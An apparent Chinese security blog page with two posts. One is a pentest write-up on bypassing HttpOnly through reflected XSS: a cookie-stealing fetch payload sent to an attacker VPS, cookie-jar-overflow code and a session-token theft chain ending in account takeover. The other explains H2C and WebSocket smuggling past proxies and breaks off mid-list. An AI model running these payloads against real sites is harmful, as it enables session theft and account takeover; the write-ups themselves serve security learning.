<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.1.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="sing&#39;s Blog">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="sing&#39;s Blog">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="sing">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>sing's Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">sing's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-首页">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-关于">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-标签">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-分类">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-归档">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/06/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BB%95%E8%BF%87-HttpOnly-%E7%9A%84-XSS-%E6%94%BB%E5%87%BB/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="sing">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="sing's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/06/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BB%95%E8%BF%87-HttpOnly-%E7%9A%84-XSS-%E6%94%BB%E5%87%BB/" class="post-title-link" itemprop="url">记一次服务器应急响应</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-02-06 13:05:01 / Modified: 21:34:39" itemprop="dateCreated datePublished" datetime="2023-02-06T13:05:01+08:00">2023-02-06</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web-%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">web 安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <ul>
<li><a href="#%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BB%95%E8%BF%87-httponly-%E7%9A%84-xss-%E6%94%BB%E5%87%BB">记一次绕过 HttpOnly 的 XSS 攻击</a><ul>
<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
<li><a href="#%E5%88%9D%E5%8F%91%E7%8E%B0">初发现</a></li>
<li><a href="#fetch-%E5%88%A9%E7%94%A8"><code>fetch()</code> 利用</a></li>
<li><a href="#cors-%E5%88%A9%E7%94%A8">CORS 利用</a></li>
<li><a href="#cookie-jar-overflow--fetch--%E7%BD%91%E7%AB%99%E7%89%B9%E6%AE%8A%E8%AE%A4%E8%AF%81%E6%96%B9%E5%BC%8F%E8%8E%B7%E5%8F%96%E6%9C%89%E6%95%88%E8%AE%A4%E8%AF%81">Cookie Jar Overflow + fetch + 网站特殊认证方式获取有效认证。</a></li>
<li><a href="#%E5%90%8E%E8%AE%B0">后记</a></li>
</ul>
</li>
</ul>
<h1 id="记一次绕过-HttpOnly-的-XSS-攻击"><a href="#记一次绕过-HttpOnly-的-XSS-攻击" class="headerlink" title="记一次绕过 HttpOnly 的 XSS 攻击"></a>记一次绕过 HttpOnly 的 XSS 攻击</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>项目中一个网站，发现该网站存在 XSS 攻击点，有基本的安全防御。本来只想弹个框就收档，无奈 <code>alert()</code> 被 WAF，然后莫名奇妙折腾下去，遂有本文。</p>
<h2 id="初发现"><a href="#初发现" class="headerlink" title="初发现"></a>初发现</h2><p>站点网页 <a href="http://example.com/xxx/getCheckHouseList?estateNum=1111">http://example.com/xxx/getCheckHouseList?estateNum=1111</a> ，访问后，<code>estateNum=1111</code> 将会反映在 JavaScript 标签中。</p>
<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage092eeed1e9fa915c8985c2a087b3dc70cb2ae208237b57553d10d673ab0fc2fa.png"></p>
<p>经过手工测试后，发现 <code>estateNum=1111</code> 存在 XSS 利用点，  尝试 <code>?estateNum=1111&#39;;alert()</code> ,发现服务器对请求不做应答。确认存在防御措施。</p>
<h2 id="fetch-利用"><a href="#fetch-利用" class="headerlink" title="fetch() 利用"></a><code>fetch()</code> 利用</h2><p>插入 <code>fetch()</code> 函数测试，发现居然通过了安全检测。修改插入的 JavaScript 代码，尝试向 VPS 发送 <code>Cookie</code>  。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?estateNum=1111&#x27;;fetch(&#x27;http://vpsip/&#x27;+document.cookie,&#123;method: &#x27;GET&#x27;&#125;);//</span><br></pre></td></tr></table></figure>

<p>查看网络发现，发送的 Cookie 字段不完整，真正有用的 JSESSIONID 缺失了。原来 JSESSIONID 设置了 HttpOnly 属性。喵喵喵？？？？</p>
<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage5df36167c363ec25aa15d73dba71def23b69d5a4ec2bc1a802cfcf38c4f40947.png"><br><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImagecd39cd156fbd98fd9e82d558c8e6c777ff10e811cacb798e7fd78e09f055a0d6.png"></p>
<h2 id="CORS-利用"><a href="#CORS-利用" class="headerlink" title="CORS 利用"></a>CORS 利用</h2><p>既然无法直接发送Cookie，那就换个方式吧。修改 JavaScript 代码，通过 fetch() 进行携带 Cookie 的跨域访问以获取 Cookie。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;http://vpsip/&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">  <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span>,</span><br><span class="line">  <span class="attr">mode</span>: <span class="string">&#x27;cors&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>理所当然，失败了。原因是误解了关于 <code>credentials: &#39;include&#39;</code> 的描述，<code>credentials: &#39;include&#39;</code> 指示浏览器只能将本域 cookie 发送到本域以及子域，但无论如何本域 Cookie 均不能发送到他域。以下是查找资源及测试后关于 <code>credentials: &#39;include&#39;</code> 的理解。</p>
<p><strong>域与子域之间：</strong></p>
<p><strong>在域的响应头中设置 <code>credentials: include</code></strong></p>
<ul>
<li>到域服务器：<code>SameSite</code> 属性为 <code>strict</code> 和 <code>lax</code> 的 cookie 会被发送到域服务器</li>
<li>到子域服务器：<code>SameSite</code> 属性为 <code>strict</code> 和 <code>lax</code> 的 cookie 会被发送到子域服务器</li>
</ul>
<p><strong>在子域的响应头中设置 <code>credentials: include</code></strong></p>
<ul>
<li>到子域服务器：<code>SameSite</code> 属性为 <code>strict</code> 和 <code>lax</code> 的 cookie 会被发送到子域服务器</li>
<li>到域服务器：<code>SameSite</code> 属性为 <code>strict</code> 和 <code>lax</code> 的 cookie 会被发送到域服务器</li>
</ul>
<p><strong>在域的响应头中设置<code>credentials: same-origin</code></strong></p>
<ul>
<li>到域服务器：<code>SameSite</code> 属性为 <code>strict</code> 和 <code>lax</code> 的 cookie 会被发送到域服务器</li>
<li>到子域服务器：没有 cookie 发送到服务器</li>
</ul>
<p><strong>在子域的响应头中设置<code>credentials: same-origin</code></strong></p>
<ul>
<li>到子域服务器：<code>SameSite</code> 属性为 <code>strict</code> 和 <code>lax</code> 的 cookie 会被发送到子域服务器</li>
<li>到域服务器：没有cookies被发送到服务器</li>
</ul>
<p><strong>域与域之间（注意：<code>SameSite：none</code> 需要 https，否则设置无效）：</strong></p>
<p><strong>在 A 域的响应头中设置 <code>credentials: include</code></strong></p>
<ul>
<li>到 A 域服务器：<code>SameSite</code> 属性为 <code>strict</code> 、 <code>lax</code> 和 <code>none</code> 的 cookie 会被发送到 A 域服务器</li>
<li>到 B 域服务器: <code>SameSite</code> 属性为 <code>none</code> 的外部 cookie 会被发送到 B 域服务器，即由 B 域设置 Cookie 会被发送，A 域 Cookie 不会被发送。</li>
</ul>
<p><strong>在 B 域的响应头中设置 <code>credentials: include</code></strong></p>
<ul>
<li>到 B 域服务器： <code>SameSite</code> 属性为 <code>strict</code> 、 <code>lax</code> 和 <code>none</code> 的 cookie 会被发送到 B 域服务器</li>
<li>到 A 域服务器：<code>SameSite</code> 属性为 <code>none</code> 的外部 cookie 会被发送到 A 服务器，即由 A 域设置 Cookie 会被发送域，B 域 Cookie 不会被发送。</li>
</ul>
<p><strong>在 A 域的响应头中设置 <code>credentials: same-origin</code></strong></p>
<ul>
<li>到 A 域服务器：<code>SameSite</code> 属性为 <code>strict</code> 、 <code>lax</code> 和 <code>none</code> 的 cookie 会被发送到 A 域服务器</li>
<li>到 B 域服务器: 没有 cookie 发送到服务器</li>
</ul>
<p><strong>在 B 域的响应头中设置 <code>credentials: same-origin</code></strong></p>
<ul>
<li>到 B 域服务器： <code>SameSite</code> 属性为 <code>strict</code> 、 <code>lax</code> 和 <code>none</code> 的 cookie 会被发送到 B 域服务器</li>
<li>到 A 域服务器：没有 cookie 发送到服务器</li>
</ul>
<blockquote>
<p>参考：<a target="_blank" rel="noopener" href="https://zellwk.com/blog/handling-cookies-with-fetchs-credentials/">https://zellwk.com/blog/handling-cookies-with-fetchs-credentials/</a></p>
</blockquote>
<h2 id="Cookie-Jar-Overflow-fetch-网站特殊认证方式获取有效认证。"><a href="#Cookie-Jar-Overflow-fetch-网站特殊认证方式获取有效认证。" class="headerlink" title="Cookie Jar Overflow + fetch + 网站特殊认证方式获取有效认证。"></a>Cookie Jar Overflow + fetch + 网站特殊认证方式获取有效认证。</h2><p>目标网站关于认证的信息：</p>
<ol>
<li>第一次访问 A 站点，服务器会进行 <code>Set-Cookie</code> 操作：<code>Set-Cookie: JSESSIONID=AAAAAA; HttpOnly</code>。</li>
<li>A 站点携带 <code>Cookie: JSESSIONID=AAAAAA</code> 访问要求凭证的接口时， 由于未进行统一认证，服务器返回 302 响应包，浏览器被重定向到统一认证地址，其中重定向地址的 <code>redirect_uri</code> 参数包含 A 站点的地址以及 base64 加密后 <code>AAAAAA</code>。</li>
<li>打开统一认证地址完成认证之后，认证服务器将返回 302 响应包，重定向地址正是 <code>步骤 2</code> 中 <code>redirect_uri</code> 参数的值</li>
<li>至此，<code>AAAAAA</code> 将变成有效凭证。</li>
</ol>
<p>对于重新认证的方式却有点不同：</p>
<ol>
<li>认证后，修改 A 站点 Cookie 为 <code>JSESSIONID=BBBBBB</code> 。</li>
<li>A 站点携带 <code>Cookie: JSESSIONID=BBBBBB</code> 访问要求凭证的接口时， 由于未进行统一认证，服务器返回 302 响应包，且进行 <code>Set-Cookie</code> 操作：<code>Set-Cookie: JSESSIONID=CCCCCC; HttpOnly</code>。浏览器被重定向到统一认证地址，其中重定向地址的 <code>redirect_uri</code> 参数包含 A 站点地址以及 base64 加密后 <code>CCCCCC</code>。</li>
<li>浏览器重定向到统一认证地址，由于之前已经完成认证，在有效时间内统一认证地址的 Cookie 将一直可用。所以，本次无需重新手动认证，统一认证站点将会直接返回 302 响应包，重定向地址正是 <code>步骤 2</code> 中 <code>redirect_uri</code> 参数的值</li>
<li>至此，<code>CCCCC</code> 将变成有效凭证。</li>
</ol>
<p>对于重新认证，又有一个特别情况：</p>
<ol>
<li>将 A 站点 Cookie 修改为 <code>JSESSIONID=BBBBBB</code>后，在携带 <code>Cookie: JSESSIONID=BBBBBB</code> 访问要求凭证的接口时，在请求包添加请求头 <code>X-Requested-With: XMLHttpRequest</code>，服务器会返回 200 响应码，包含 <code>Set-Cookie: JSESSIONID=CCCCCC</code> 以及响应主体 json 数据，该 json 数据包含统一认证地址，地址中的 <code>redirect_uri</code> 参数包含 A 站点地址以及 base64 加密后 <code>CCCCCC</code>。</li>
<li>再次访问要求凭证的接口，A 站点将返回与 <code>步骤 1 </code> 所提及的，一模一样的统一认证地址。</li>
<li>统一认证地址返回 302 ，再次进行重定向。</li>
<li>至此，<code>CCCCC</code> 将变成有效凭证</li>
</ol>
<p>基于上面的情况，构建如下攻击方式：</p>
<ol>
<li><p>通过 Cookie Jar Overflow 攻击覆盖原来有效的 Cookie，即 <code>Cookie: JSESSIONID=AAAAAA</code> 覆盖为 <code>Cookie: JSESSIONID=BBBBBB</code>。</p>
  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Cookie Jar Overflow</span></span><br><span class="line"><span class="comment">//生成多个 cookie</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">700</span>; i++) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">cookie</span> = <span class="string">`cookie<span class="subst">$&#123;i&#125;</span>=<span class="subst">$&#123;i&#125;</span>`</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除所有 cookie</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">700</span>; i++) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">cookie</span> = <span class="string">`cookie<span class="subst">$&#123;i&#125;</span>=<span class="subst">$&#123;i&#125;</span>;expires=Thu, 01 Jan 1970 00:00:01 GMT`</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//覆盖 HttpOnly cookie</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span> = <span class="string">&quot;JSESSIONID=BBBBBB;path=/&quot;</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>通过 fetch() 访问要求访问凭证接口，需添加 <code>X-Requested-With: XMLHttpRequest</code> 请求头。正如 <em><strong>对于重新认证，又有一个特别情况</strong></em> 所提及，服务器返回 json 数据，fetch 也提供了读取 json 数据的处理函数，所以我们可以将 json 数据读取出来，并将关键部分发送到 vps ，且 vps 返回重定向响应要求受害者浏览器访问 A 站点要求凭证的接口。<em><strong>重新认证</strong></em> 流程走一遍之后，发送到 vps 的凭证将变得可用。</p>
</li>
</ol>
<blockquote>
<p>为什么要添加 <code>X-Requested-With: XMLHttpRequest</code>，而不直接访问？因为到现在为止还未发现 fetch() 中读取 302 响应包的请求头方式。  </p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;http://target.com/requiredAuthenticationAPI&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span> <span class="comment">//针对此应用程序，不添加该请求头服务器无法返回包含新可用 cookie 的 json 数据。</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">response</span>) &#123;</span><br><span class="line">    response.<span class="title function_">json</span>().<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">        location = <span class="string">&#x27;http://127.0.0.1/location.html?x=&#x27;</span> + data.<span class="property">data</span>; <span class="comment">//</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;).<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error:&#x27;</span>, error);</span><br><span class="line">&#125;); <span class="comment">//</span></span><br></pre></td></tr></table></figure>
<ul>
<li>location.html</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>=<span class="string">&quot;http://target.com/requiredAuthenticationAPI&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ol start="3">
<li>成功获取有效凭证并控制账号。</li>
</ol>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>关于 “<em><strong>Cookie Jar Overflow + fetch + 网站特殊认证方式获取有效认证。</strong></em>“ 的利用，后面发现了一些情况。  JavaScript 代码执行到 fetch() 代码处，浏览器将根据代码生成请求包，但请求不立刻发送。待后续 JavaScript 代码执行完后，再进行发送。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/05/H2C%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%94%BB%E5%87%BB/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="sing">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="sing's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/01/05/H2C%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%94%BB%E5%87%BB/" class="post-title-link" itemprop="url">H2C请求走私攻击</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-01-05 22:36:07 / Modified: 22:37:19" itemprop="dateCreated datePublished" datetime="2023-01-05T22:36:07+08:00">2023-01-05</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="H2C-走私"><a href="#H2C-走私" class="headerlink" title="H2C 走私"></a>H2C 走私</h1><h2 id="基于明文之上的-HTTP2（H2C）"><a href="#基于明文之上的-HTTP2（H2C）" class="headerlink" title="基于明文之上的 HTTP2（H2C）"></a>基于明文之上的 HTTP2（H2C）</h2><p>正常的 HTTP 连接生命周期很短，只能维持一个请求及响应结束时间段，通常被认为是“瞬时连接”。而基于明文之上的 HTTP2 （H2C）则是持久连接。用户基于明文 HTTP 协议发送升级请求，若服务器支持 HTTP2,则可与服务器建立 HTTP&#x2F;2 without TLS 的长 TCP 连接。根据 RFC 规范，H2C 升级需要发送3个标头：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Upgrade</span><span class="punctuation">: </span>h2c</span><br><span class="line"><span class="attribute">HTTP2-Settings</span><span class="punctuation">: </span>AAMAAABkAARAAAAAAAIAAAAA</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Upgrade, HTTP2-Settings</span><br></pre></td></tr></table></figure>
<p>在升级连接后，反向代理会维持客户端与服务器之间的 TCP 连接，不再对用户请求进行监控。所以使用H2C走私，我们可以绕过反向代理在处理请求时使用的规则，例如基于路径的路由、身份验证或WAF处理，前提是我们可以首先建立H2C连接。<br><img src="https://1517081779-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-L_2uGJGU7AVNRcqRvEi%2F-MYiNoPp7dKn0s5bdZ6M%2F-MYifMersS4wCMeAnpZR%2Fimage.png?alt=media&token=1b0278b6-9023-49f5-8e0e-cd9f233dc103"></p>
<h2 id="受该脆弱性影响的代理"><a href="#受该脆弱性影响的代理" class="headerlink" title="受该脆弱性影响的代理"></a>受该脆弱性影响的代理</h2><p>根据上述可知，为了进行 H2C 升级，代理服务器需要转发合规的 H2C 升级头（<code>Upgrade</code> 和 <code>Connection</code> ），但有时候可以忽略 <code>Connection</code> 头中的 <code>HTTP2-Settings</code>。<br>默认情况下，以下代理会在代理传递期间转发 <code>Upgrade</code> 和 <code>Connection</code> 标头，从而存在 h2c 走私漏洞:</p>
<ul>
<li>HAProxy</li>
<li>Traefik</li>
<li>Nuster</li>
</ul>
<p>默认情况下，以下代理在代理传递期间不会转发合规的 H2C 连接升级所需的头（<code>Upgrade</code> 和 <code>Connection</code>），这意味着像AWS ALB&#x2F;CLB、NGINX和Apache流量服务器等负载均衡器在默认情况下会阻止 H2C 连接。但由于不是所有的后端都会按照规范行事或者不安全的方式配置依然可能会导致 H2C 走私漏洞的出现。例如，后端被设置了为只需要如下形式就可以进行升级，而无需遵守 RFC 规范。<br> <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Upgrade</span><span class="punctuation">: </span>h2c</span><br><span class="line"><span class="attribute">HTTP2-Settings</span><span class="punctuation">: </span>AAMAAABkAARAAAAAAAIAAAAA</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Upgrade</span><br></pre></td></tr></table></figure></p>
<ul>
<li>AWS ALB&#x2F;CLB</li>
<li>NGINX</li>
<li>Apache</li>
<li>Squid</li>
<li>Varnish</li>
<li>Kong</li>
<li>Envoy</li>
<li>Apache Traffic Server</li>
</ul>
<h1 id="websocket-走私"><a href="#websocket-走私" class="headerlink" title="websocket 走私"></a>websocket 走私</h1><p>类似 H2C 走私，创建一个 websocket 通道，绕过代理服务器的限制，直接访问受限制的 api 接口。</p>
<p><img src="https://1517081779-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FzlcoMJy2zVUU3WrrTLmj%2Fimage.png?alt=media&token=10bb58c6-2aee-4f05-bd67-9f82e0c1cbd3"></p>
<h2 id="场景一："><a href="#场景一：" class="headerlink" title="场景一："></a>场景一：</h2><ol>
<li>服务器支持 websocket，同时存在一个受限的 api，该 api 由代理功能进行限制。 正常情况下，我们无法访问该 api。</li>
<li>首先发送一个错误协议版本的 websocket 连接升级请求包到代理，代理不检查 <code>Sec-WebSocket-Version</code> 头，直接将请求转发给后端。</li>
<li>因为请求头 <code>Sec-WebSocket-Version</code> 中的协议版本不正确，后端返回带有状态码 <code>426</code> 的响应。然而，反向代理没有检查来自后端的响应，错误认为后端已经为 <code>WebSocket</code> 通信做好了准备，并且将该响应返回给客户端。</li>
<li>最后，反向代理认为在客户端和后端之间建立 <code>WebSocket</code> 连接。在现实中没有 <code>WebSocket</code> 连接，因为错误的协议版本号导致后端拒绝升级请求。同时，代理将客户端和后端之间的TCP或TLS连接保持在打开状态。客户端可以通过连接发送 HTTP 请求轻松原本受限的 api 。</li>
</ol>
<p><img src="https://github.com/0ang3el/websocket-smuggle/raw/master/img/2-4.png"></p>
<h2 id="场景二："><a href="#场景二：" class="headerlink" title="场景二："></a>场景二：</h2><ol>
<li>大多数反向代理(例如NGINX)在握手部分从后端检查状态代码。这使得攻击更加困难，但并非不可能。</li>
<li>后端支持 websocket，有一个受限的 api ，一个 healthcheck API（<code>/api/health</code>）</li>
<li>Healthcheck API通过发送 POST 请求调用，参数名 u 控制访问地址 URL。后端访问外部资源并将状态代码返回给客户端。</li>
<li>首先，客户端发送POST请求来调用 healthcheck API，但该请求含有 HTTP 报头 <code>Upgrade: websocket</code>。NGINX认为这是一个正常的升级请求，它只寻找升级头，跳过请求的其他部分。代理将请求转发到后端。</li>
<li>其次，后端调用 <code>healthcheck API</code>，访问由恶意用户控制的外部资源，该外部资源返回带有状态码 <code>101</code> 的 HTTP 响应。后端将该响应转发到反向代理。由于 NGINX 只验证状态码，它会认为后端已经为 <code>WebSocket</code> 通信做好了准备，并将响应返回给客户端。</li>
</ol>
<p><img src="https://github.com/0ang3el/websocket-smuggle/raw/master/img/3-4.png"></p>
<ol start="6">
